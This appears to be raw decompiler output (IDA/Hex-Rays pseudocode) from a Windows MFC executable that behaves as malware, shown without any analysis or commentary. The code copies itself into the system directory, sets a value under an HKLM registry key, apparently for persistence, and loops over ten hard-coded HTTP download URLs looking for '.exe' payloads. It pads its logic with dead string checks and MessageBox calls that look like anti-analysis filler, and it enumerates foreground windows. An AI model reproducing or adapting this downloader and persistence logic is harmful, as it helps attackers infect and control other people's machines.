  int v0; // esi
  const struct CString *v1; // edi
  bool v2; // bl
  int v3; // ebx
  int v5; // [esp+0h] [ebp-40h] BYREF
  int v6; // [esp+Ch] [ebp-34h]
  int v7; // [esp+10h] [ebp-30h]
  int v8; // [esp+14h] [ebp-2Ch]
  int v9; // [esp+18h] [ebp-28h]
  int v10; // [esp+1Ch] [ebp-24h]
  int v11; // [esp+20h] [ebp-20h] BYREF
  char v12[4]; // [esp+24h] [ebp-1Ch] BYREF
  int v13; // [esp+28h] [ebp-18h] BYREF
  char v14[4]; // [esp+2Ch] [ebp-14h] BYREF
  int *v15; // [esp+30h] [ebp-10h]
  int v16; // [esp+3Ch] [ebp-4h]

  v15 = &v5;
  v8 = 0;
  if ( dword_403D48 > 0 )
  {
    do
    {
      v0 = v8;
      v1 = (const struct CString *)(dword_403D44 + 4 * v8);
      v9 = 0;
      v10 = 0;
      v7 = 2 * v8;
      CString::CString((CString *)&v11, v1);
      v16 = 0;
      if ( *(int *)(v11 - 8) <= 7 )
      {
        v2 = 0;
      }
      else
      {
        CString::CString((CString *)v12, (const struct CString *)(dword_403D44 + 2 * v7));
        v10 = 1;
        v16 = 1;
        v6 = CString::Find((CString *)v12, aExe);
        CString::CString((CString *)&v13, (const struct CString *)(dword_403D44 + 2 * v7));
        v9 = 1;
        v16 = 2;
        v2 = v6 != *(_DWORD *)(v13 - 8) - 4;
      }
      v16 = -1;
      if ( v9 )
        CString::~CString((CString *)&v13);
      v16 = 0;
      if ( v10 )
        CString::~CString((CString *)v12);
      v16 = -1;
      CString::~CString((CString *)&v11);
      if ( v2 )
      {
        CString::CString((CString *)v14, (const struct CString *)(dword_403D44 + 2 * v7));
        v16 = 3;
        v3 = sub_40141C((unsigned __int8 *)v1, (CString *)v14);
        v16 = -1;
        CString::~CString((CString *)v14);
        if ( v3 )
        {
          sub_40195C();
          if ( sub_401FB0() == 1 )
            break;
        }
      }
      v8 = v0 + 1;
    }
    while ( v0 + 1 < dword_403D48 );
  }
  return 0;
}
// 403D44: using guessed type int dword_403D44;
// 402164: using guessed type char var_1C[4];
// 402164: using guessed type char var_14[4];

//----- (004022F4) --------------------------------------------------------
int __usercall sub_4022F4@<eax>(unsigned __int8 *a1@<edi>)
{
  FILE *v1; // eax
  int v3; // [esp+0h] [ebp-84h] BYREF
  int v4; // [esp+Ch] [ebp-78h] BYREF
  char v5[4]; // [esp+10h] [ebp-74h] BYREF
  int v6; // [esp+14h] [ebp-70h] BYREF
  char v7[4]; // [esp+18h] [ebp-6Ch] BYREF
  int v8; // [esp+1Ch] [ebp-68h] BYREF
  char v9[4]; // [esp+20h] [ebp-64h] BYREF
  int v10; // [esp+24h] [ebp-60h] BYREF
  char v11[4]; // [esp+28h] [ebp-5Ch] BYREF
  int v12; // [esp+2Ch] [ebp-58h] BYREF
  char v13[4]; // [esp+30h] [ebp-54h] BYREF
  int v14; // [esp+34h] [ebp-50h] BYREF
  char v15[4]; // [esp+38h] [ebp-4Ch] BYREF
  int v16; // [esp+3Ch] [ebp-48h] BYREF
  char v17[4]; // [esp+40h] [ebp-44h] BYREF
  int v18; // [esp+44h] [ebp-40h] BYREF
  char v19[4]; // [esp+48h] [ebp-3Ch] BYREF
  int v20; // [esp+4Ch] [ebp-38h] BYREF
  char v21[4]; // [esp+50h] [ebp-34h] BYREF
  int v22; // [esp+54h] [ebp-30h] BYREF
  char v23[4]; // [esp+58h] [ebp-2Ch] BYREF
  int v24; // [esp+5Ch] [ebp-28h] BYREF
  char v25[4]; // [esp+60h] [ebp-24h] BYREF
  int v26; // [esp+64h] [ebp-20h] BYREF
  char v27[4]; // [esp+68h] [ebp-1Ch] BYREF
  int v28; // [esp+6Ch] [ebp-18h] BYREF
  char v29[4]; // [esp+70h] [ebp-14h] BYREF
  int *v30; // [esp+74h] [ebp-10h]
  int v31; // [esp+80h] [ebp-4h]

  v30 = &v3;
  CStringArray::SetSize((CStringArray *)&dword_403D40, 0, -1);
  v1 = fopen(FileName, Mode);
  if ( v1 )
  {
    fclose(v1);
  }
  else
  {
    sub_4017D0((int)a1, 33);
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, dword_403D48, aHttpFlusentier);
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, dword_403D48, aHttpWwwRenatek);
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, dword_403D48, aHttpWwwBerkili);
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, dword_403D48, aHttpAdolfSeege);
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, dword_403D48, aHttpThaibaaOrg);
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, dword_403D48, aHttpThaifisher);
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, dword_403D48, aHttpAlsiroyalD);
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, dword_403D48, aHttpGanzheitli);
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, dword_403D48, aHttp213819568I);
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, dword_403D48, aHttpFestivalga);
    sub_40195C();
    v31 = 0;
    CString::CString((CString *)&v4, aCndrnndlkkffhq);
    v31 = 1;
    CString::Left(&v4, v5, 10);
    v31 = 2;
    CString::operator=(&v4, v5);
    v31 = 1;
    CString::~CString((CString *)v5);
    if ( *(_DWORD *)(v4 - 8) == 435347 )
      MessageBoxA(0, Caption, Caption, 0);
    v31 = 0;
    CString::~CString((CString *)&v4);
    v31 = 4;
    CString::CString((CString *)&v6, aJrpsoij);
    v31 = 5;
    CString::Left(&v6, v7, 10);
    v31 = 6;
    CString::operator=(&v6, v7);
    v31 = 5;
    CString::~CString((CString *)v7);
    if ( *(_DWORD *)(v6 - 8) == 435347 )
      MessageBoxA(0, Text, Text, 0);
    v31 = 4;
    CString::~CString((CString *)&v6);
    v31 = 8;
    CString::CString((CString *)&v8, aEhofchl);
    v31 = 9;
    CString::Left(&v8, v9, 10);
    v31 = 10;
    CString::operator=(&v8, v9);
    v31 = 9;
    CString::~CString((CString *)v9);
    if ( *(_DWORD *)(v8 - 8) == 435347 )
      MessageBoxA(0, aGreatestValueW, aGreatestValueW, 0);
    v31 = 8;
    CString::~CString((CString *)&v8);
    v31 = 12;
    CString::CString((CString *)&v10, aSkbdffspsn);
    v31 = 13;
    CString::Left(&v10, v11, 10);
    v31 = 14;
    CString::operator=(&v10, v11);
    v31 = 13;
    CString::~CString((CString *)v11);
    if ( *(_DWORD *)(v10 - 8) == 435347 )
      MessageBoxA(0, aAdvancingOurPr, aAdvancingOurPr, 0);
    v31 = 12;
    CString::~CString((CString *)&v10);
    v31 = 16;
    CString::CString((CString *)&v12, aMhcbsroldkkoek);
    v31 = 17;
    CString::Left(&v12, v13, 10);
    v31 = 18;
    CString::operator=(&v12, v13);
    v31 = 17;
    CString::~CString((CString *)v13);
    if ( *(_DWORD *)(v12 - 8) == 435347 )
      MessageBoxA(0, aTowardTheInsti, aTowardTheInsti, 0);
    v31 = 16;
    CString::~CString((CString *)&v12);
    v31 = 20;
    CString::CString((CString *)&v14, aNrildihdelffgr);
    v31 = 21;
    CString::Left(&v14, v15, 10);
    v31 = 22;
    CString::operator=(&v14, v15);
    v31 = 21;
    CString::~CString((CString *)v15);
    if ( *(_DWORD *)(v14 - 8) == 435347 )
      MessageBoxA(0, aGoalsFurther, aGoalsFurther, 0);
    v31 = 20;
    CString::~CString((CString *)&v14);
    v31 = 24;
    CString::CString((CString *)&v16, aGqefjphcigodbj);
    v31 = 25;
    CString::Left(&v16, v17, 10);
    v31 = 26;
    CString::operator=(&v16, v17);
    v31 = 25;
    CString::~CString((CString *)v17);
    if ( *(_DWORD *)(v16 - 8) == 435347 )
      MessageBoxA(0, aAccomplishment_0, aAccomplishment_0, 0);
    v31 = 24;
    CString::~CString((CString *)&v16);
    v31 = 28;
    CString::CString((CString *)&v18, aJoldkkels);
    v31 = 29;
    CString::Left(&v18, v19, 10);
    v31 = 30;
    CString::operator=(&v18, v19);
    v31 = 29;
    CString::~CString((CString *)v19);
    if ( *(_DWORD *)(v18 - 8) == 435347 )
      MessageBoxA(0, aNot, aNot, 0);
    v31 = 28;
    CString::~CString((CString *)&v18);
    v31 = 32;
    CString::CString((CString *)&v20, aKnsnhmnipsrjpp);
    v31 = 33;
    CString::Left(&v20, v21, 10);
    v31 = 34;
    CString::operator=(&v20, v21);
    v31 = 33;
    CString::~CString((CString *)v21);
    if ( *(_DWORD *)(v20 - 8) == 435347 )
      MessageBoxA(0, aSolelyTheResul, aSolelyTheResul, 0);
    v31 = 32;
    CString::~CString((CString *)&v20);
    v31 = 36;
    CString::CString((CString *)&v22, aRcpjkffqcegjhk);
    v31 = 37;
    CString::Left(&v22, v23, 10);
    v31 = 38;
    CString::operator=(&v22, v23);
    v31 = 37;
    CString::~CString((CString *)v23);
    if ( *(_DWORD *)(v22 - 8) == 435347 )
      MessageBoxA(0, aPersonsEfforts, aPersonsEfforts, 0);
    v31 = 36;
    CString::~CString((CString *)&v22);
    v31 = 40;
    CString::CString((CString *)&v24, aEjlhseeoipm);
    v31 = 41;
    CString::Left(&v24, v25, 10);
    v31 = 42;
    CString::operator=(&v24, v25);
    v31 = 41;
    CString::~CString((CString *)v25);
    if ( *(_DWORD *)(v24 - 8) == 435347 )
      MessageBoxA(0, aRatherTheResul, aRatherTheResul, 0);
    v31 = 40;
    CString::~CString((CString *)&v24);
    v31 = 44;
    CString::CString((CString *)&v26, aIklqelsefogimk);
    v31 = 45;
    CString::Left(&v26, v27, 10);
    v31 = 46;
    CString::operator=(&v26, v27);
    v31 = 45;
    CString::~CString((CString *)v27);
    if ( *(_DWORD *)(v26 - 8) == 435347 )
      MessageBoxA(0, aOfSupportThatT, aOfSupportThatT, 0);
    v31 = 44;
    CString::~CString((CString *)&v26);
    v31 = 48;
    CString::CString((CString *)&v28, aIfnsrohfifi);
    v31 = 49;
    CString::Left(&v28, v29, 10);
    v31 = 50;
    CString::operator=(&v28, v29);
    v31 = 49;
    CString::~CString((CString *)v29);
    if ( *(_DWORD *)(v28 - 8) == 435347 )
      MessageBoxA(0, aIndividualRece, aIndividualRece, 0);
    v31 = 48;
    CString::~CString((CString *)&v28);
    v31 = -1;
  }
  return sub_401A64(a1);
}
// 4036E2: using guessed type int __thiscall CString::operator=(_DWORD, _DWORD);
// 40370C: using guessed type int __thiscall CString::Left(_DWORD, _DWORD, _DWORD);
// 403D40: using guessed type int dword_403D40;
// 4022F4: using guessed type char var_74[4];
// 4022F4: using guessed type char var_6C[4];
// 4022F4: using guessed type char var_64[4];
// 4022F4: using guessed type char var_5C[4];
// 4022F4: using guessed type char var_54[4];
// 4022F4: using guessed type char var_4C[4];
// 4022F4: using guessed type char var_44[4];
// 4022F4: using guessed type char var_3C[4];
// 4022F4: using guessed type char var_34[4];
// 4022F4: using guessed type char var_2C[4];
// 4022F4: using guessed type char var_24[4];
// 4022F4: using guessed type char var_1C[4];
// 4022F4: using guessed type char var_14[4];

//----- (00402BB8) --------------------------------------------------------
void __noreturn sub_402BB8()
{
  struct AFX_MODULE_STATE *ModuleState; // eax
  LSTATUS v1; // eax
  int v2; // eax
  CString *v3; // [esp+0h] [ebp-4CCh] BYREF
  int v4; // [esp+4h] [ebp-4C8h] BYREF
  char v5[4]; // [esp+8h] [ebp-4C4h] BYREF
  int v6; // [esp+Ch] [ebp-4C0h] BYREF
  char v7[4]; // [esp+10h] [ebp-4BCh] BYREF
  CHAR Buffer[260]; // [esp+14h] [ebp-4B8h] BYREF
  CHAR Filename[256]; // [esp+118h] [ebp-3B4h] BYREF
  char v10[2]; // [esp+218h] [ebp-2B4h] BYREF
  char v11[2]; // [esp+21Ah] [ebp-2B2h] BYREF
  char v12[4]; // [esp+21Ch] [ebp-2B0h] BYREF
  LPCSTR lpNewFileName; // [esp+220h] [ebp-2ACh] BYREF
  HKEY v14; // [esp+224h] [ebp-2A8h]
  HKEY hKey; // [esp+228h] [ebp-2A4h]
  HKEY phkResult; // [esp+22Ch] [ebp-2A0h] BYREF
  DWORD dwDisposition; // [esp+230h] [ebp-29Ch] BYREF
  char v18[32]; // [esp+234h] [ebp-298h] BYREF
  char v19[600]; // [esp+254h] [ebp-278h] BYREF
  LPCSTR lpExistingFileName; // [esp+4B8h] [ebp-14h]
  CString **v21; // [esp+4BCh] [ebp-10h]
  int v22; // [esp+4C8h] [ebp-4h]

  v21 = &v3;
  v22 = 0;
  CString::CString((CString *)&v4, aFhrl);
  v22 = 1;
  CString::Left(&v4, v5, 10);
  v22 = 2;
  CString::operator=(&v4, v5);
  v22 = 1;
  CString::~CString((CString *)v5);
  if ( *(_DWORD *)(v4 - 8) == 435347 )
    MessageBoxA(0, aEtc, aEtc, 0);
  v22 = 0;
  CString::~CString((CString *)&v4);
  v22 = 4;
  CString::CString((CString *)&v6, aQdcionfmfikmeh);
  v22 = 5;
  CString::Left(&v6, v7, 10);
  v22 = 6;
  CString::operator=(&v6, v7);
  v22 = 5;
  CString::~CString((CString *)v7);
  if ( *(_DWORD *)(v6 - 8) == 435347 )
    MessageBoxA(0, aAsSomeone, aAsSomeone, 0);
  v22 = 4;
  CString::~CString((CString *)&v6);
  v22 = -1;
  Sleep(0x493E0u);
  qmemcpy(Buffer, &unk_406120, sizeof(Buffer));
  GetSystemDirectoryA(Buffer, 0x104u);
  CString::operator=(&dword_403D24, Buffer);
  CString::operator+=(&dword_403D24, asc_40728C);
  qmemcpy(Filename, &unk_406000, sizeof(Filename));
  qmemcpy(v10, (char *)&unk_406000 + 256, sizeof(v10));
  ModuleState = AfxGetModuleState();
  GetModuleFileNameA(*((HMODULE *)ModuleState + 2), Filename, 0x104u);
  CString::operator=(&dword_403D20, Filename);
  CString::MakeLower((CString *)&dword_403D20);
  operator+(v12, &dword_403D24, aDriversC656Tx);
  v22 = 8;
  CString::operator=(&FileName, v12);
  v22 = -1;
  CString::~CString((CString *)v12);
  lpExistingFileName = (LPCSTR)dword_403D20;
  operator+(&lpNewFileName, &dword_403D24, Data);
  v22 = 9;
  CopyFileA(lpExistingFileName, lpNewFileName, 0);
  v22 = -1;
  CString::~CString((CString *)&lpNewFileName);
  sub_4022F4((unsigned __int8 *)v11);
  v14 = 0;
  hKey = 0;
  v22 = 11;
  phkResult = 0;
  v1 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 0, 0, 0xF003Fu, 0, &phkResult, &dwDisposition);
  if ( !v1 )
  {
    v1 = 0;
    if ( hKey )
    {
      v1 = RegCloseKey(hKey);
      hKey = 0;
    }
    hKey = phkResult;
  }
  if ( !v1 )
  {
    v2 = lstrlenA((LPCSTR)Data);
    RegSetValueExA(hKey, aOlpr, 0, 1u, Data, v2 + 1);
  }
  v22 = 10;
  if ( hKey )
  {
    RegCloseKey(hKey);
    hKey = 0;
  }
  if ( v14 )
  {
    RegCloseKey(v14);
    v14 = 0;
  }
  v3 = (CString *)v18;
  CString::CString((CString *)v18);
  v22 = 12;
  `eh vector constructor iterator'(
    v19,
    0xCu,
    50,
    (void (__thiscall *)(void *))sub_403584,
    (void (__thiscall *)(void *))sub_403520);
  v22 = 13;
  sub_4030D0(v18);
  while ( 1 )
  {
    sub_402164();
    SleepEx(0x1B7740u, 1);
  }
}
// 402BB8: using guessed type void __noreturn sub_402BB8();
// 4036AC: using guessed type int __stdcall operator+(_DWORD, _DWORD, _DWORD);
// 4036E2: using guessed type int __thiscall CString::operator=(_DWORD, _DWORD);
// 40370C: using guessed type int __thiscall CString::Left(_DWORD, _DWORD, _DWORD);
// 403718: using guessed type int __thiscall CString::operator=(_DWORD, _DWORD);
// 40371E: using guessed type int __thiscall CString::operator+=(_DWORD, _DWORD);
// 403D20: using guessed type int dword_403D20;
// 403D24: using guessed type int dword_403D24;
// 402BB8: using guessed type char var_4C4[4];
// 402BB8: using guessed type char var_4BC[4];
// 402BB8: using guessed type char var_2B0[4];
// 402BB8: using guessed type char var_278[600];

//----- (00402FBC) --------------------------------------------------------
int __thiscall sub_402FBC(int *this, int a2, int a3, int a4)
{
  int *v5; // esi
  int v6; // ebx
  int v7; // [esp+0h] [ebp-24h] BYREF
  int v8; // [esp+Ch] [ebp-18h]
  int *v9; // [esp+10h] [ebp-14h]
  int *v10; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  v10 = &v7;
  v9 = this;
  v8 = a4;
  v11 = 1;
  if ( *this <= 49 )
  {
    CString::MakeLower((CString *)&a3);
    CString::MakeLower((CString *)&a2);
    v5 = v9;
    v6 = (*v9)++;
    CString::operator=(&v5[2 * v6 + 5 + v6], &a3);
    v5[3 * *v5 + 3] = v8;
    CString::operator=(&v5[3 * *v5 + 1], &a2);
    v11 = 0;
    CString::~CString((CString *)&a3);
    v11 = -1;
    CString::~CString((CString *)&a2);
    return 1;
  }
  else
  {
    v11 = 0;
    CString::~CString((CString *)&a3);
    v11 = -1;
    CString::~CString((CString *)&a2);
    return 0;
  }
}
// 4036E2: using guessed type int __thiscall CString::operator=(_DWORD, _DWORD);

//----- (004030D0) --------------------------------------------------------
int __thiscall sub_4030D0(void *this)
{
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 7) = -1;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 6) = 0;
  if ( !sub_403188() )
    return 0;
  if ( !*((_DWORD *)this + 3) )
    AfxBeginThread(sub_4032D0, this, 0, 0, 0, 0);
  return 1;
}

//----- (00403114) --------------------------------------------------------
int __userpurge sub_403114@<eax>(int *a1@<ecx>, DWORD a2@<esi>, int a3)
{
  int v4; // ebp
  int v6; // edi
  HWND ForegroundWindow; // eax
  int v8; // ebx
  int dwProcessId[5]; // [esp+0h] [ebp-14h] BYREF

  dwProcessId[0] = a2;
  v4 = 1;
  if ( a3 )
  {
    if ( !a1[6] )
      return 0;
    v4 = 500;
  }
  else
  {
    a1[6] = 0;
  }
  v6 = 0;
  while ( 1 )
  {
    ForegroundWindow = GetForegroundWindow();
    v8 = (int)ForegroundWindow;
    if ( ForegroundWindow != (HWND)a1[6] )
      break;
    if ( ++v6 >= v4 )
      return 0;
  }
  GetWindowThreadProcessId(ForegroundWindow, (LPDWORD)dwProcessId);
  if ( dwProcessId[0] == a1[4] )
  {
    a1[6] = v8;
    sub_4031C8(a1);
  }
  return a1[6];
}
// 403149: conditional instruction was optimized away because ebp.4 is in (==1|==1F4)
// 403114: using guessed type DWORD dwProcessId[5];

//----- (00403184) --------------------------------------------------------
int sub_403184()
{
  return 0;
}

//----- (00403188) --------------------------------------------------------
int sub_403188()
{
  return 0;
}

//----- (004031C8) --------------------------------------------------------
HWND __thiscall sub_4031C8(int *this)
{
  HWND result; // eax
  int v2; // [esp-4h] [ebp-234h] BYREF
  char v3[4]; // [esp+0h] [ebp-230h] BYREF
  CHAR String[500]; // [esp+8h] [ebp-228h] BYREF
  char v5[12]; // [esp+1FCh] [ebp-34h] BYREF
  int *v6; // [esp+214h] [ebp-1Ch]
  int *v7; // [esp+218h] [ebp-18h]
  HWND hWndChildAfter; // [esp+21Ch] [ebp-14h]
  CHAR *v9; // [esp+220h] [ebp-10h]
  int v10; // [esp+22Ch] [ebp-4h]

  v9 = String;
  this[7] = -1;
  v7 = this;
  v6 = this + 7;
  hWndChildAfter = 0;
  qmemcpy(String, &unk_406240, sizeof(String));
  while ( 1 )
  {
    result = FindWindowExA((HWND)v7[6], hWndChildAfter, 0, 0);
    hWndChildAfter = result;
    if ( !result )
      break;
    GetWindowTextA(result, String, 500);
    CString::CString((CString *)v5, String);
    v10 = 0;
    GetClassNameA(hWndChildAfter, String, 500);
    CString::CString((CString *)&v2, (const struct CString *)v5);
    CString::CString((CString *)v3, String);
    sub_402FBC(v6, v2, *(int *)v3, (int)hWndChildAfter);
    v10 = -1;
    CString::~CString((CString *)v5);
  }
  return result;
}
// 4031C8: using guessed type char var_230[4];

//----- (004032D0) --------------------------------------------------------
unsigned int __cdecl sub_4032D0(void *a1)
{
  while ( !*((_DWORD *)a1 + 5) )
  {
    Sleep(2u);
    if ( sub_403114((int *)a1, (DWORD)a1, 0) )
    {
      sub_403184();
      *((_DWORD *)a1 + 5) = 1;
      *((_DWORD *)a1 + 7) = -1;
    }
  }
  return 0;
}

//----- (00403314) --------------------------------------------------------
int sub_403314()
{
  CString::CString((CString *)&dword_403D20);
  atexit(sub_403408);
  CString::CString((CString *)&FileName);
  atexit(sub_4033FC);
  CString::CString((CString *)&dword_403D24);
  atexit(sub_4033F0);
  CWinApp::CWinApp((CWinApp *)&dword_403C40, 0);
  dword_403C40 = (int)&off_406D40;
  atexit((void (__cdecl *)())sub_403398);
  CStringArray::CStringArray((CStringArray *)&dword_403D40);
  return atexit(sub_40338C);
}
// 403C40: using guessed type int dword_403C40;
// 403D20: using guessed type int dword_403D20;
// 403D24: using guessed type int dword_403D24;
// 403D40: using guessed type int dword_403D40;
// 406D40: using guessed type struct CRuntimeClass *(__thiscall *off_406D40)(CWinApp *__hidden this);

//----- (0040338C) --------------------------------------------------------
void __cdecl sub_40338C()
{
  CStringArray::~CStringArray((CStringArray *)&dword_403D40);
}
// 403D40: using guessed type int dword_403D40;

//----- (00403398) --------------------------------------------------------
void __usercall sub_403398(int a1@<edi>, int a2@<esi>)
{
  int v2[8]; // [esp+0h] [ebp-20h] BYREF

  v2[4] = (int)v2;
  v2[0] = a1;
  v2[1] = a2;
  v2[3] = (int)&dword_403C40;
  v2[7] = -1;
  CWinApp::~CWinApp((CWinApp *)&dword_403C40);
}
// 403C40: using guessed type int dword_403C40;

//----- (004033F0) --------------------------------------------------------
void __cdecl sub_4033F0()
{
  CString::~CString((CString *)&dword_403D24);
}
// 403D24: using guessed type int dword_403D24;

//----- (004033FC) --------------------------------------------------------
void __cdecl sub_4033FC()
{
  CString::~CString((CString *)&FileName);
}

//----- (00403408) --------------------------------------------------------
void __cdecl sub_403408()
{
  CString::~CString((CString *)&dword_403D20);
}
// 403D20: using guessed type int dword_403D20;

//----- (00403414) --------------------------------------------------------
int (**sub_403414())()
{
  return &off_406464;
}
// 406464: using guessed type int (*off_406464)();

//----- (0040341C) --------------------------------------------------------
int sub_40341C()
{
  return CWinApp::messageMap;
}

//----- (00403424) --------------------------------------------------------
HKEY __thiscall sub_403424(HKEY *this)
{
  HKEY result; // eax

  result = *this;
  if ( *this )
  {
    result = (HKEY)RegCloseKey(*this);
    *this = 0;
  }
  return result;
}

//----- (00403440) --------------------------------------------------------
void __usercall sub_403440(int a1@<ecx>, int a2@<edi>, int a3@<esi>)
{
  int v3[4]; // [esp+0h] [ebp-24h] BYREF
  CString *v4; // [esp+10h] [ebp-14h]
  int *v5; // [esp+14h] [ebp-10h]
  int v6; // [esp+20h] [ebp-4h]

  v5 = v3;
  v3[0] = a2;
  v3[1] = a3;
  v4 = (CString *)a1;
  v3[3] = a1 + 28;
  v6 = 0;
  `eh vector destructor iterator'((void *)(a1 + 32), 0xCu, 50, (void (__thiscall *)(void *))sub_403520);
  CString::~CString(v4);
}

//----- (004034C4) --------------------------------------------------------
void __usercall sub_4034C4(int a1@<ecx>, int a2@<edi>, int a3@<esi>)
{
  int v3[8]; // [esp+0h] [ebp-20h] BYREF

  v3[4] = (int)v3;
  v3[0] = a2;
  v3[1] = a3;
  v3[3] = a1;
  v3[7] = -1;
  `eh vector destructor iterator'((void *)(a1 + 4), 0xCu, 50, (void (__thiscall *)(void *))sub_403520);
}

//----- (00403520) --------------------------------------------------------
void __usercall sub_403520(void *a1@<ecx>, int a2@<edi>, int a3@<esi>)
{
  int v3[2]; // [esp+0h] [ebp-20h] BYREF
  CString *v4; // [esp+Ch] [ebp-14h]
  int *v5; // [esp+10h] [ebp-10h]
  int v6; // [esp+1Ch] [ebp-4h]

  v5 = v3;
  v3[0] = a2;
  v3[1] = a3;
  v4 = (CString *)a1;
  v6 = 0;
  CString::~CString((CString *)((char *)a1 + 4));
  CString::~CString(v4);
}

//----- (00403584) --------------------------------------------------------
void __usercall sub_403584(void *a1@<ecx>, int a2@<edi>, int a3@<esi>)
{
  int v3[2]; // [esp+0h] [ebp-20h] BYREF
  CString *v4; // [esp+Ch] [ebp-14h]
  int *v5; // [esp+10h] [ebp-10h]
  int v6; // [esp+1Ch] [ebp-4h]

  v5 = v3;
  v3[0] = a2;
  v3[1] = a3;
  v4 = (CString *)a1;
  CString::CString((CString *)a1);
  v6 = 0;
  CString::CString((CString *)((char *)v4 + 4));
}

//----- (004035E8) --------------------------------------------------------
void __userpurge sub_4035E8(void *a1@<ecx>, int a2@<edi>, int a3@<esi>, char a4)
{
  int v4[2]; // [esp+0h] [ebp-24h] BYREF
  void *v5; // [esp+Ch] [ebp-18h]
  CWinApp *v6; // [esp+10h] [ebp-14h]
  int *v7; // [esp+14h] [ebp-10h]
  int v8; // [esp+20h] [ebp-4h]

  v7 = v4;
  v4[0] = a2;
  v4[1] = a3;
  v5 = a1;
  v6 = (CWinApp *)a1;
  v8 = -1;
  CWinApp::~CWinApp((CWinApp *)a1);
  if ( (a4 & 1) != 0 )
    operator delete(v5);
}

//----- (00403BB2) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (00403C02) --------------------------------------------------------
int sub_403C02()
{
  int result; // eax

  result = AfxInitialize(0, 0x600u);
  byte_403C38 = result;
  return result;
}
// 403C38: using guessed type char byte_403C38;

// nfuncs=136 queued=34 decompiled=34 lumina nreq=0 worse=0 better=0
// ALL OK, 34 function(s) have been successfully decompiled
